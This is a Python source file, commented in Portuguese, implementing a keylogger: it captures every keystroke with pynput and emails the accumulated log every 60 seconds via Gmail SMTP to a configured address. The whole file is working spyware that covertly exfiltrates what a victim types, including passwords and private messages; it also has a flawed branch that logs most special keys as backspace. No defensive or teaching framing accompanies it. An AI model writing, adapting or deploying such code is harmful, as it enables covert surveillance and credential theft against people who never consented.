from pynput import keyboard               #Importar a biblioteca do pynput para a captura das teclas
import smtplib                            #Importar a biblioteca smtplib para o envio das informações
from email.mime.text import MIMEText
from threading import Timer                 

log = ""

#Config do e-mail
EMAIL_ORIGEM = "email_@gmail.com"         #Email que receberá as informações.
EMAIL_DESTINO = "email_@gmail.com"
SENHA_EMAIL = "senha_email"               #senha do email que receberá as informações.

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados Keylogger"
        msg['FROM'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)

        log = ""

    #Agendar envio a cada 60
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log+= key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log+=" "
        if key == keyboard.Key.enter:
            log+= "\n"
        elif keyboard.Key.backspace:
            log+= "[<]"
        else:
            pass #Ignorar control, shifft, etc...

#Iniciar o keylogger e o envio automatico
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()
